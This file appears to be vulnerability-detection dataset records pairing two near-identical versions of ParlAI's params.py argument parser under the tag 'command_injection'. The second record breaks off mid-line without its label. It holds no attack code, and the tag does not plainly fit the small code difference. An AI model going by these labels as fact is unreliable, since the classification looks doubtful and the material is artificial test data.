[{"id": "601668d569e1276e0b8bf2bf8fb43e391e10d170", "code": "parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.\n# All rights reserved.\n# This source code is licensed under the BSD-style license found in the\n# LICENSE file in the root directory of this source tree. An additional grant\n# of patent rights can be found in the PATENTS file in the same directory.\n\"\"\"Provides an argument parser and a set of default command line options for\nusing the ParlAI package.\n\"\"\"\n\nimport argparse\nimport importlib\nimport os\nimport sys\nfrom parlai.core.agents import get_agent_module, get_task_module\nfrom parlai.tasks.tasks import ids_to_tasks\n\n\ndef str2bool(value):\n    v = value.lower()\n    if v in ('yes', 'true', 't', '1', 'y'):\n        return True\n    elif v in ('no', 'false', 'f', 'n', '0'):\n        return False\n    else:\n        raise argparse.ArgumentTypeError('Boolean value expected.')\n\n\ndef str2class(value):\n    \"\"\"From import path string, returns the class specified. For example, the\n    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns\n    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.\n    \"\"\"\n    if ':' not in value:\n        raise RuntimeError('Use a colon before the name of the class.')\n    name = value.split(':')\n    module = importlib.import_module(name[0])\n    return getattr(module, name[1])\n\n\ndef class2str(value):\n    \"\"\"Inverse of params.str2class().\"\"\"\n    s = str(value)\n    s = s[s.find('\\'') + 1:s.rfind('\\'')]  # pull out import path\n    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'\n    return s\n\n\ndef modelzoo_path(datapath, path):\n    \"\"\"If path starts with 'models', then we remap it to the model zoo path\n    within the data directory (default is ParlAI/data/models).\n    .\"\"\"\n    if path is None:\n        return None\n    if not path.startswith('models:'):\n        return path\n    else:\n        # Check if we need to download the model\n        animal = path[7:path.rfind('/')].replace('/', '.')\n        module_name = f\"parlai.zoo.{animal}\"\n        print(module_name)\n        try:\n            my_module = importlib.import_module(module_name)\n            download = getattr(my_module, 'download')\n            download(datapath)\n        except (ModuleNotFoundError, AttributeError):\n            pass\n        return os.path.join(datapath, 'models', path[7:])\n\n\nclass ParlaiParser(argparse.ArgumentParser):\n    \"\"\"Pseudo-extension of ``argparse`` which sets a number of parameters\n    for the ParlAI framework. More options can be added specific to other\n    modules by passing this object and calling ``add_arg()`` or\n    ``add_argument()`` on it.\n\n    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.\n    \"\"\"\n\n    def __init__(self, add_parlai_args=True, add_model_args=False):\n        \"\"\"Initializes the ParlAI argparser.\n        - add_parlai_args (default True) initializes the default arguments for\n        ParlAI package, including the data download paths and task arguments.\n        - add_model_args (default False) initializes the default arguments for\n        loading models, including initializing arguments from that model.\n        \"\"\"\n        super().__init__(description='ParlAI parser.', allow_abbrev=False,\n                         conflict_handler='resolve')\n        self.register('type', 'bool', str2bool)\n        self.register('type', 'class', str2class)\n        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(\n                            os.path.realpath(__file__)))))\n        os.environ['PARLAI_HOME'] = self.parlai_home\n\n        self.add_arg = self.add_argument\n\n        # remember which args were specified on the command line\n        self.cli_args = sys.argv\n        self.overridable = {}\n\n        if add_parlai_args:\n            self.add_parlai_args()\n        if add_model_args:\n            self.add_model_args()\n\n    def add_parlai_data_path(self, argument_group=None):\n        if argument_group is None:\n            argument_group = self\n        default_data_path = os.path.join(self.parlai_home, 'data')\n        argument_group.add_argument(\n            '-dp', '--datapath', default=default_data_path,\n            help='path to datasets, defaults to {parlai_dir}/data')\n\n    def add_mturk_args(self):\n        mturk = self.add_argument_group('Mechanical Turk')\n        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')\n        mturk.add_argument(\n            '--mturk-log-path', default=default_log_path,\n            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')\n        mturk.add_argument(\n            '-t', '--task',\n            help='MTurk task, e.g. \"qa_data_collection\" or \"model_evaluator\"')\n        mturk.add_argument(\n            '-nc', '--num-conversations', default=1, type=int,\n            help='number of conversations you want to create for this task')\n        mturk.add_argument(\n            '--unique', dest='unique_worker', default=False,\n            action='store_true',\n            help='enforce that no worker can work on your task twice')\n        mturk.add_argument(\n            '--unique-qual-name', dest='unique_qual_name',\n            default=None, type=str,\n            help='qualification name to use for uniqueness between HITs')\n        mturk.add_argument(\n            '-r', '--reward', default=0.05, type=float,\n            help='reward for each worker for finishing the conversation, '\n                 'in US dollars')\n        mturk.add_argument(\n            '--sandbox', dest='is_sandbox', action='store_true',\n            help='submit the HITs to MTurk sandbox site')\n        mturk.add_argument(\n            '--live', dest='is_sandbox', action='store_false',\n            help='submit the HITs to MTurk live site')\n        mturk.add_argument(\n            '--debug', dest='is_debug', action='store_true',\n            help='print and log all server interactions and messages')\n        mturk.add_argument(\n            '--verbose', dest='verbose', action='store_true',\n            help='print all messages sent to and from Turkers')\n        mturk.add_argument(\n            '--hard-block', dest='hard_block', action='store_true',\n            default=False,\n            help='Hard block disconnecting Turkers from all of your HITs')\n        mturk.add_argument(\n            '--log-level', dest='log_level', type=int, default=20,\n            help='importance level for what to put into the logs. the lower '\n                 'the level the more that gets logged. values are 0-50')\n        mturk.add_argument(\n            '--block-qualification', dest='block_qualification', default='',\n            help='Qualification to use for soft blocking users. By default '\n                 'turkers are never blocked, though setting this will allow '\n                 'you to filter out turkers that have disconnected too many '\n                 'times on previous HITs where this qualification was set.')\n        mturk.add_argument(\n            '--count-complete', dest='count_complete',\n            default=False, action='store_true',\n            help='continue until the requested number of conversations are '\n                 'completed rather than attempted')\n        mturk.add_argument(\n            '--allowed-conversations', dest='allowed_conversations',\n            default=0, type=int,\n            help='number of concurrent conversations that one mturk worker '\n                 'is able to be involved in, 0 is unlimited')\n        mturk.add_argument(\n            '--max-connections', dest='max_connections',\n            default=30, type=int,\n            help='number of HITs that can be launched at the same time, 0 is '\n                 'unlimited.'\n        )\n        mturk.add_argument(\n            '--min-messages', dest='min_messages',\n            default=0, type=int,\n            help='number of messages required to be sent by MTurk agent when '\n                 'considering whether to approve a HIT in the event of a '\n                 'partner disconnect. I.e. if the number of messages '\n                 'exceeds this number, the turker can submit the HIT.'\n        )\n        mturk.add_argument(\n            '--local', dest='local', default=False, action='store_true',\n            help='Run the server locally on this server rather than setting up'\n                 ' a heroku server.'\n        )\n\n        mturk.set_defaults(is_sandbox=True)\n        mturk.set_defaults(is_debug=False)\n        mturk.set_defaults(verbose=False)\n\n    def add_messenger_args(self):\n        messenger = self.add_argument_group('Facebook Messenger')\n        messenger.add_argument(\n            '--debug', dest='is_debug', action='store_true',\n            help='print and log all server interactions and messages')\n        messenger.add_argument(\n            '--verbose', dest='verbose', action='store_true',\n            help='print all messages sent to and from Turkers')\n        messenger.add_argument(\n            '--log-level', dest='log_level', type=int, default=20,\n            help='importance level for what to put into the logs. the lower '\n                 'the level the more that gets logged. values are 0-50')\n        messenger.add_argument(\n            '--force-page-token', dest='force_page_token', action='store_true',\n            help='override the page token stored in the cache for a new one')\n        messenger.add_argument(\n            '--password', dest='password', type=str, default=None,\n            help='Require a password for entry to the bot')\n        messenger.add_argument(\n            '--local', dest='local', action='store_true', default=False,\n            help='Run the server locally on this server rather than setting up'\n                 ' a heroku server.'\n        )\n\n        messenger.set_defaults(is_debug=False)\n        messenger.set_defaults(verbose=False)\n\n    def add_parlai_args(self, args=None):\n        default_downloads_path = os.path.join(self.parlai_home, 'downloads')\n        parlai = self.add_argument_group('Main ParlAI Arguments')\n        parlai.add_argument(\n            '-t', '--task',\n            help='ParlAI task(s), e.g. \"babi:Task1\" or \"babi,cbt\"')\n        parlai.add_argument(\n            '--download-path', default=default_downloads_path,\n            help='path for non-data dependencies to store any needed files.'\n                 'defaults to {parlai_dir}/downloads')\n        parlai.add_argument(\n            '-dt', '--datatype', default='train',\n            choices=['train', 'train:stream', 'train:ordered',\n                     'train:ordered:stream', 'train:stream:ordered',\n                     'valid', 'valid:stream', 'test', 'test:stream'],\n            help='choose from: train, train:ordered, valid, test. to stream '\n                 'data add \":stream\" to any option (e.g., train:stream). '\n                 'by default: train is random with replacement, '\n                 'valid is ordered, test is ordered.')\n        parlai.add_argument(\n            '-im', '--image-mode', default='raw', type=str,\n            help='image preprocessor to use. default is \"raw\". set to \"none\" '\n                 'to skip image loading.')\n        parlai.add_argument(\n            '-nt', '--numthreads', default=1, type=int,\n            help='number of threads. If batchsize set to 1, used for hogwild; '\n                 'otherwise, used for number of threads in threadpool loading,'\n                 ' e.g. in vqa')\n        parlai.add_argument(\n            '--hide-labels', default=False, type='bool',\n            help='default (False) moves labels in valid and test sets to the '\n                 'eval_labels field. If True, they are hidden completely.')\n        batch = self.add_argument_group('Batching Arguments')\n        batch.add_argument(\n            '-bs', '--batchsize', default=1, type=int,\n            help='batch size for minibatch training schemes')\n        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',\n                           help='If enabled (default True), create batches by '\n                                'flattening all episodes to have exactly one '\n                                'utterance exchange and then sorting all the '\n                                'examples according to their length. This '\n                                'dramatically reduces the amount of padding '\n                                'present after examples have been parsed, '\n                                'speeding up training.')\n        batch.add_argument('-clen', '--context-length', default=-1, type=int,\n                           help='Number of past utterances to remember when '\n                                'building flattened batches of data in multi-'\n                                'example episodes.')\n        batch.add_argument('-incl', '--include-labels',\n                           default=True, type='bool',\n                           help='Specifies whether or not to include labels '\n                                'as past utterances when building flattened '\n                                'batches of data in multi-example episodes.')\n        self.add_parlai_data_path(parlai)\n\n    def add_model_args(self):\n        \"\"\"Add arguments related to models such as model files.\"\"\"\n        model_args = self.add_argument_group('ParlAI Model Arguments')\n        model_args.add_argument(\n            '-m', '--model', default=None,\n            help='the model class name. can match parlai/agents/<model> for '\n                 'agents in that directory, or can provide a fully specified '\n                 'module for `from X import Y` via `-m X:Y` '\n                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')\n        model_args.add_argument(\n            '-mf', '--model-file', default=None,\n            help='model file name for loading and saving models')\n        model_args.add_argument(\n            '--dict-class',\n            help='the class of the dictionary agent uses')\n\n    def add_model_subargs(self, model):\n        \"\"\"Add arguments specific to a particular model.\"\"\"\n        agent = get_agent_module(model)\n        try:\n            if hasattr(agent, 'add_cmdline_args'):\n                agent.add_cmdline_args(self)\n        except argparse.ArgumentError:\n            # already added\n            pass\n        try:\n            if hasattr(agent, 'dictionary_class'):\n                s = class2str(agent.dictionary_class())\n                self.set_defaults(dict_class=s)\n        except argparse.ArgumentError:\n            # already added\n            pass\n\n    def add_task_args(self, task):\n        \"\"\"Add arguments specific to the specified task.\"\"\"\n        for t in ids_to_tasks(task).split(','):\n            agent = get_task_module(t)\n            try:\n                if hasattr(agent, 'add_cmdline_args'):\n                    agent.add_cmdline_args(self)\n            except argparse.ArgumentError:\n                # already added\n                pass\n\n    def add_image_args(self, image_mode):\n        \"\"\"Add additional arguments for handling images.\"\"\"\n        try:\n            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')\n            parlai.add_argument('--image-size', type=int, default=256,\n                                help='resizing dimension for images')\n            parlai.add_argument('--image-cropsize', type=int, default=224,\n                                help='crop dimension for images')\n        except argparse.ArgumentError:\n            # already added\n            pass\n\n\n    def add_extra_args(self, args=None):\n        \"\"\"Add more args depending on how known args are set.\"\"\"\n        parsed = vars(self.parse_known_args(args, nohelp=True)[0])\n\n        # find which image mode specified if any, and add additional arguments\n        image_mode = parsed.get('image_mode', None)\n        if image_mode is not None and image_mode != 'none':\n            self.add_image_args(image_mode)\n\n        # find which task specified if any, and add its specific arguments\n        task = parsed.get('task', None)\n        if task is not None:\n            self.add_task_args(task)\n        evaltask = parsed.get('evaltask', None)\n        if evaltask is not None:\n            self.add_task_args(evaltask)\n\n        # find which model specified if any, and add its specific arguments\n        model = parsed.get('model', None)\n        if model is not None:\n            self.add_model_subargs(model)\n\n        # reset parser-level defaults over any model-level defaults\n        try:\n            self.set_defaults(**self._defaults)\n        except AttributeError:\n            raise RuntimeError('Please file an issue on github that argparse '\n                               'got an attribute error when parsing.')\n\n\n    def parse_known_args(self, args=None, namespace=None, nohelp=False):\n        \"\"\"Custom parse known args to ignore help flag.\"\"\"\n        if nohelp:\n            # ignore help\n            args = sys.argv[1:] if args is None else args\n            args = [a for a in args if a != '-h' and a != '--help']\n        return super().parse_known_args(args, namespace)\n\n\n    def parse_args(self, args=None, namespace=None, print_args=True):\n        \"\"\"Parses the provided arguments and returns a dictionary of the\n        ``args``. We specifically remove items with ``None`` as values in order\n        to support the style ``opt.get(key, default)``, which would otherwise\n        return ``None``.\n        \"\"\"\n        self.add_extra_args(args)\n        self.args = super().parse_args(args=args)\n        self.opt = vars(self.args)\n\n        # custom post-parsing\n        self.opt['parlai_home'] = self.parlai_home\n        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:\n            # hide batch options\n            self.opt.pop('batch_sort', None)\n            self.opt.pop('context_length', None)\n\n        # set environment variables\n        if self.opt.get('download_path'):\n            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']\n        if self.opt.get('datapath'):\n            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']\n\n        # map filenames that start with 'models:' to point to the model zoo dir\n        if self.opt.get('model_file') is not None:\n            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),\n                                                   self.opt['model_file'])\n        if self.opt.get('dict_file') is not None:\n            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),\n                                                  self.opt['dict_file'])\n\n        # set all arguments specified in commandline as overridable\n        option_strings_dict = {}\n        store_true = []\n        store_false = []\n        for group in self._action_groups:\n            for a in group._group_actions:\n                if hasattr(a, 'option_strings'):\n                    for option in a.option_strings:\n                        option_strings_dict[option] = a.dest\n                        if '_StoreTrueAction' in str(type(a)):\n                            store_true.append(option)\n                        elif '_StoreFalseAction' in str(type(a)):\n                            store_false.append(option)\n\n        for i in range(len(self.cli_args)):\n            if self.cli_args[i] in option_strings_dict:\n                if self.cli_args[i] in store_true:\n                    self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                        True\n                elif self.cli_args[i] in store_false:\n                    self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                        False\n                else:\n                    if i < (len(self.cli_args) - 1) and \\\n                            self.cli_args[i+1][0] != '-':\n                        self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                            self.cli_args[i+1]\n        self.opt['override'] = self.overridable\n\n        if print_args:\n            self.print_args()\n\n        return self.opt\n\n    def print_args(self):\n        \"\"\"Print out all the arguments in this parser.\"\"\"\n        if not self.opt:\n            self.parse_args(print_args=False)\n        values = {}\n        for key, value in self.opt.items():\n            values[str(key)] = str(value)\n        for group in self._action_groups:\n            group_dict = {\n                a.dest: getattr(self.args, a.dest, None)\n                for a in group._group_actions\n            }\n            namespace = argparse.Namespace(**group_dict)\n            count = 0\n            for key in namespace.__dict__:\n                if key in values:\n                    if count == 0:\n                        print('[ ' + group.title + ': ] ')\n                    count += 1\n                    print('[  ' + key + ': ' + values[key] + ' ]')\n\n    def set_params(self, **kwargs):\n        \"\"\"Set overridable kwargs.\"\"\"\n        self.set_defaults(**kwargs)\n        for k, v in kwargs.items():\n            self.overridable[k] = v\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "601668d569e1276e0b8bf2bf8fb43e391e10d170", "code": "/parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.\n# All rights reserved.\n# This source code is licensed under the BSD-style license found in the\n# LICENSE file in the root directory of this source tree. An additional grant\n# of patent rights can be found in the PATENTS file in the same directory.\n\"\"\"Provides an argument parser and a set of default command line options for\nusing the ParlAI package.\n\"\"\"\n\nimport argparse\nimport importlib\nimport os\nimport sys\nfrom parlai.core.agents import get_agent_module, get_task_module\nfrom parlai.tasks.tasks import ids_to_tasks\n\n\ndef str2bool(value):\n    v = value.lower()\n    if v in ('yes', 'true', 't', '1', 'y'):\n        return True\n    elif v in ('no', 'false', 'f', 'n', '0'):\n        return False\n    else:\n        raise argparse.ArgumentTypeError('Boolean value expected.')\n\n\ndef str2class(value):\n    \"\"\"From import path string, returns the class specified. For example, the\n    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns\n    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.\n    \"\"\"\n    if ':' not in value:\n        raise RuntimeError('Use a colon before the name of the class.')\n    name = value.split(':')\n    module = importlib.import_module(name[0])\n    return getattr(module, name[1])\n\n\ndef class2str(value):\n    \"\"\"Inverse of params.str2class().\"\"\"\n    s = str(value)\n    s = s[s.find('\\'') + 1:s.rfind('\\'')]  # pull out import path\n    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'\n    return s\n\n\ndef modelzoo_path(datapath, path):\n    \"\"\"If path starts with 'models', then we remap it to the model zoo path\n    within the data directory (default is ParlAI/data/models).\n    .\"\"\"\n    if path is None:\n        return None\n    if not path.startswith('models:'):\n        return path\n    else:\n        # Check if we need to download the model\n        animal = path[7:path.rfind('/')].replace('/', '.')\n        module_name = f\"parlai.zoo.{animal}\"\n        print(module_name)\n        try:\n            my_module = importlib.import_module(module_name)\n            download = getattr(my_module, 'download')\n            download(datapath)\n        except (ModuleNotFoundError, AttributeError):\n            pass\n        return os.path.join(datapath, 'models', path[7:])\n\n\nclass ParlaiParser(argparse.ArgumentParser):\n    \"\"\"Pseudo-extension of ``argparse`` which sets a number of parameters\n    for the ParlAI framework. More options can be added specific to other\n    modules by passing this object and calling ``add_arg()`` or\n    ``add_argument()`` on it.\n\n    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.\n    \"\"\"\n\n    def __init__(self, add_parlai_args=True, add_model_args=False):\n        \"\"\"Initializes the ParlAI argparser.\n        - add_parlai_args (default True) initializes the default arguments for\n        ParlAI package, including the data download paths and task arguments.\n        - add_model_args (default False) initializes the default arguments for\n        loading models, including initializing arguments from that model.\n        \"\"\"\n        super().__init__(description='ParlAI parser.', allow_abbrev=False,\n                         conflict_handler='resolve')\n        self.register('type', 'bool', str2bool)\n        self.register('type', 'class', str2class)\n        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(\n                            os.path.realpath(__file__)))))\n        os.environ['PARLAI_HOME'] = self.parlai_home\n\n        self.add_arg = self.add_argument\n\n        # remember which args were specified on the command line\n        self.cli_args = sys.argv\n        self.overridable = {}\n\n        if add_parlai_args:\n            self.add_parlai_args()\n        if add_model_args:\n            self.add_model_args()\n\n    def add_parlai_data_path(self, argument_group=None):\n        if argument_group is None:\n            argument_group = self\n        default_data_path = os.path.join(self.parlai_home, 'data')\n        argument_group.add_argument(\n            '-dp', '--datapath', default=default_data_path,\n            help='path to datasets, defaults to {parlai_dir}/data')\n\n    def add_mturk_args(self):\n        mturk = self.add_argument_group('Mechanical Turk')\n        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')\n        mturk.add_argument(\n            '--mturk-log-path', default=default_log_path,\n            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')\n        mturk.add_argument(\n            '-t', '--task',\n            help='MTurk task, e.g. \"qa_data_collection\" or \"model_evaluator\"')\n        mturk.add_argument(\n            '-nc', '--num-conversations', default=1, type=int,\n            help='number of conversations you want to create for this task')\n        mturk.add_argument(\n            '--unique', dest='unique_worker', default=False,\n            action='store_true',\n            help='enforce that no worker can work on your task twice')\n        mturk.add_argument(\n            '--unique-qual-name', dest='unique_qual_name',\n            default=None, type=str,\n            help='qualification name to use for uniqueness between HITs')\n        mturk.add_argument(\n            '-r', '--reward', default=0.05, type=float,\n            help='reward for each worker for finishing the conversation, '\n                 'in US dollars')\n        mturk.add_argument(\n            '--sandbox', dest='is_sandbox', action='store_true',\n            help='submit the HITs to MTurk sandbox site')\n        mturk.add_argument(\n            '--live', dest='is_sandbox', action='store_false',\n            help='submit the HITs to MTurk live site')\n        mturk.add_argument(\n            '--debug', dest='is_debug', action='store_true',\n            help='print and log all server interactions and messages')\n        mturk.add_argument(\n            '--verbose', dest='verbose', action='store_true',\n            help='print all messages sent to and from Turkers')\n        mturk.add_argument(\n            '--hard-block', dest='hard_block', action='store_true',\n            default=False,\n            help='Hard block disconnecting Turkers from all of your HITs')\n        mturk.add_argument(\n            '--log-level', dest='log_level', type=int, default=20,\n            help='importance level for what to put into the logs. the lower '\n                 'the level the more that gets logged. values are 0-50')\n        mturk.add_argument(\n            '--block-qualification', dest='block_qualification', default='',\n            help='Qualification to use for soft blocking users. By default '\n                 'turkers are never blocked, though setting this will allow '\n                 'you to filter out turkers that have disconnected too many '\n                 'times on previous HITs where this qualification was set.')\n        mturk.add_argument(\n            '--count-complete', dest='count_complete',\n            default=False, action='store_true',\n            help='continue until the requested number of conversations are '\n                 'completed rather than attempted')\n        mturk.add_argument(\n            '--allowed-conversations', dest='allowed_conversations',\n            default=0, type=int,\n            help='number of concurrent conversations that one mturk worker '\n                 'is able to be involved in, 0 is unlimited')\n        mturk.add_argument(\n            '--max-connections', dest='max_connections',\n            default=30, type=int,\n            help='number of HITs that can be launched at the same time, 0 is '\n                 'unlimited.'\n        )\n        mturk.add_argument(\n            '--min-messages', dest='min_messages',\n            default=0, type=int,\n            help='number of messages required to be sent by MTurk agent when '\n                 'considering whether to approve a HIT in the event of a '\n                 'partner disconnect. I.e. if the number of messages '\n                 'exceeds this number, the turker can submit the HIT.'\n        )\n        mturk.add_argument(\n            '--local', dest='local', default=False, action='store_true',\n            help='Run the server locally on this server rather than setting up'\n                 ' a heroku server.'\n        )\n\n        mturk.set_defaults(is_sandbox=True)\n        mturk.set_defaults(is_debug=False)\n        mturk.set_defaults(verbose=False)\n\n    def add_messenger_args(self):\n        messenger = self.add_argument_group('Facebook Messenger')\n        messenger.add_argument(\n            '--debug', dest='is_debug', action='store_true',\n            help='print and log all server interactions and messages')\n        messenger.add_argument(\n            '--verbose', dest='verbose', action='store_true',\n            help='print all messages sent to and from Turkers')\n        messenger.add_argument(\n            '--log-level', dest='log_level', type=int, default=20,\n            help='importance level for what to put into the logs. the lower '\n                 'the level the more that gets logged. values are 0-50')\n        messenger.add_argument(\n            '--force-page-token', dest='force_page_token', action='store_true',\n            help='override the page token stored in the cache for a new one')\n        messenger.add_argument(\n            '--password', dest='password', type=str, default=None,\n            help='Require a password for entry to the bot')\n        messenger.add_argument(\n            '--local', dest='local', action='store_true', default=False,\n            help='Run the server locally on this server rather than setting up'\n                 ' a heroku server.'\n        )\n\n        messenger.set_defaults(is_debug=False)\n        messenger.set_defaults(verbose=False)\n\n    def add_parlai_args(self, args=None):\n        default_downloads_path = os.path.join(self.parlai_home, 'downloads')\n        parlai = self.add_argument_group('Main ParlAI Arguments')\n        parlai.add_argument(\n            '-t', '--task',\n            help='ParlAI task(s), e.g. \"babi:Task1\" or \"babi,cbt\"')\n        parlai.add_argument(\n            '--download-path', default=default_downloads_path,\n            help='path for non-data dependencies to store any needed files.'\n                 'defaults to {parlai_dir}/downloads')\n        parlai.add_argument(\n            '-dt', '--datatype', default='train',\n            choices=['train', 'train:stream', 'train:ordered',\n                     'train:ordered:stream', 'train:stream:ordered',\n                     'valid', 'valid:stream', 'test', 'test:stream'],\n            help='choose from: train, train:ordered, valid, test. to stream '\n                 'data add \":stream\" to any option (e.g., train:stream). '\n                 'by default: train is random with replacement, '\n                 'valid is ordered, test is ordered.')\n        parlai.add_argument(\n            '-im', '--image-mode', default='raw', type=str,\n            help='image preprocessor to use. default is \"raw\". set to \"none\" '\n                 'to skip image loading.')\n        parlai.add_argument(\n            '-nt', '--numthreads', default=1, type=int,\n            help='number of threads. If batchsize set to 1, used for hogwild; '\n                 'otherwise, used for number of threads in threadpool loading,'\n                 ' e.g. in vqa')\n        parlai.add_argument(\n            '--hide-labels', default=False, type='bool',\n            help='default (False) moves labels in valid and test sets to the '\n                 'eval_labels field. If True, they are hidden completely.')\n        batch = self.add_argument_group('Batching Arguments')\n        batch.add_argument(\n            '-bs', '--batchsize', default=1, type=int,\n            help='batch size for minibatch training schemes')\n        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',\n                           help='If enabled (default True), create batches by '\n                                'flattening all episodes to have exactly one '\n                                'utterance exchange and then sorting all the '\n                                'examples according to their length. This '\n                                'dramatically reduces the amount of padding '\n                                'present after examples have been parsed, '\n                                'speeding up training.')\n        batch.add_argument('-clen', '--context-length', default=-1, type=int,\n                           help='Number of past utterances to remember when '\n                                'building flattened batches of data in multi-'\n                                'example episodes.')\n        batch.add_argument('-incl', '--include-labels',\n                           default=True, type='bool',\n                           help='Specifies whether or not to include labels '\n                                'as past utterances when building flattened '\n                                'batches of data in multi-example episodes.')\n        self.add_parlai_data_path(parlai)\n\n    def add_model_args(self):\n        \"\"\"Add arguments related to models such as model files.\"\"\"\n        model_args = self.add_argument_group('ParlAI Model Arguments')\n        model_args.add_argument(\n            '-m', '--model', default=None,\n            help='the model class name. can match parlai/agents/<model> for '\n                 'agents in that directory, or can provide a fully specified '\n                 'module for `from X import Y` via `-m X:Y` '\n                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')\n        model_args.add_argument(\n            '-mf', '--model-file', default=None,\n            help='model file name for loading and saving models')\n        model_args.add_argument(\n            '--dict-class',\n            help='the class of the dictionary agent uses')\n\n    def add_model_subargs(self, model):\n        \"\"\"Add arguments specific to a particular model.\"\"\"\n        agent = get_agent_module(model)\n        try:\n            if hasattr(agent, 'add_cmdline_args'):\n                agent.add_cmdline_args(self)\n        except argparse.ArgumentError:\n            # already added\n            pass\n        try:\n            if hasattr(agent, 'dictionary_class'):\n                s = class2str(agent.dictionary_class())\n                self.set_defaults(dict_class=s)\n        except argparse.ArgumentError:\n            # already added\n            pass\n\n    def add_task_args(self, task):\n        \"\"\"Add arguments specific to the specified task.\"\"\"\n        for t in ids_to_tasks(task).split(','):\n            agent = get_task_module(t)\n            try:\n                if hasattr(agent, 'add_cmdline_args'):\n                    agent.add_cmdline_args(self)\n            except argparse.ArgumentError:\n                # already added\n                pass\n\n    def add_image_args(self, image_mode):\n        \"\"\"Add additional arguments for handling images.\"\"\"\n        try:\n            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')\n            parlai.add_argument('--image-size', type=int, default=256,\n                                help='resizing dimension for images')\n            parlai.add_argument('--image-cropsize', type=int, default=224,\n                                help='crop dimension for images')\n        except argparse.ArgumentError:\n            # already added\n            pass\n\n\n    def add_extra_args(self, args=None):\n        \"\"\"Add more args depending on how known args are set.\"\"\"\n        parsed = vars(self.parse_known_args(nohelp=True)[0])\n\n        # find which image mode specified if any, and add additional arguments\n        image_mode = parsed.get('image_mode', None)\n        if image_mode is not None and image_mode != 'none':\n            self.add_image_args(image_mode)\n\n        # find which task specified if any, and add its specific arguments\n        task = parsed.get('task', None)\n        if task is not None:\n            self.add_task_args(task)\n        evaltask = parsed.get('evaltask', None)\n        if evaltask is not None:\n            self.add_task_args(evaltask)\n\n        # find which model specified if any, and add its specific arguments\n        model = parsed.get('model', None)\n        if model is not None:\n            self.add_model_subargs(model)\n\n        # reset parser-level defaults over any model-level defaults\n        try:\n            self.set_defaults(**self._defaults)\n        except AttributeError:\n            raise RuntimeError('Please file an issue on github that argparse '\n                               'got an attribute error when parsing.')\n\n\n    def parse_known_args(self, args=None, namespace=None, nohelp=False):\n        \"\"\"Custom parse known args to ignore help flag.\"\"\"\n        if nohelp:\n            # ignore help\n            args = sys.argv[1:] if args is None else args\n            args = [a for a in args if a != '-h' and a != '--help']\n        return super().parse_known_args(args, namespace)\n\n\n    def parse_args(self, args=None, namespace=None, print_args=True):\n        \"\"\"Parses the provided arguments and returns a dictionary of the\n        ``args``. We specifically remove items with ``None`` as values in order\n        to support the style ``opt.get(key, default)``, which would otherwise\n        return ``None``.\n        \"\"\"\n        self.add_extra_args(args)\n        self.args = super().parse_args(args=args)\n        self.opt = vars(self.args)\n\n        # custom post-parsing\n        self.opt['parlai_home'] = self.parlai_home\n        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:\n            # hide batch options\n            self.opt.pop('batch_sort', None)\n            self.opt.pop('context_length', None)\n\n        # set environment variables\n        if self.opt.get('download_path'):\n            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']\n        if self.opt.get('datapath'):\n            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']\n\n        # map filenames that start with 'models:' to point to the model zoo dir\n        if self.opt.get('model_file') is not None:\n            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),\n                                                   self.opt['model_file'])\n        if self.opt.get('dict_file') is not None:\n            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),\n                                                  self.opt['dict_file'])\n\n        # set all arguments specified in commandline as overridable\n        option_strings_dict = {}\n        store_true = []\n        store_false = []\n        for group in self._action_groups:\n            for a in group._group_actions:\n                if hasattr(a, 'option_strings'):\n                    for option in a.option_strings:\n                        option_strings_dict[option] = a.dest\n                        if '_StoreTrueAction' in str(type(a)):\n                            store_true.append(option)\n                        elif '_StoreFalseAction' in str(type(a)):\n                            store_false.append(option)\n\n        for i in range(len(self.cli_args)):\n            if self.cli_args[i] in option_strings_dict:\n                if self.cli_args[i] in store_true:\n                    self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                        True\n                elif self.cli_args[i] in store_false:\n                    self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                        False\n                else:\n                    if i < (len(self.cli_args) - 1) and \\\n                            self.cli_args[i+1][0] != '-':\n                        self.overridable[option_strings_dict[self.cli_args[i]]] = \\\n                            self.cli_args[i+1]\n        self.opt['override'] = self.overridable\n\n        if print_args:\n            self.print_args()\n\n        return self.opt\n\n    def print_args(self):\n        \"\"\"Print out all the arguments in this parser.\"\"\"\n        if not self.opt:\n            self.parse_args(print_args=False)\n        values = {}\n        for key, value in self.opt.items():\n            values[str(key)] = str(value)\n        for group in self._action_groups:\n            group_dict = {\n                a.dest: getattr(self.args, 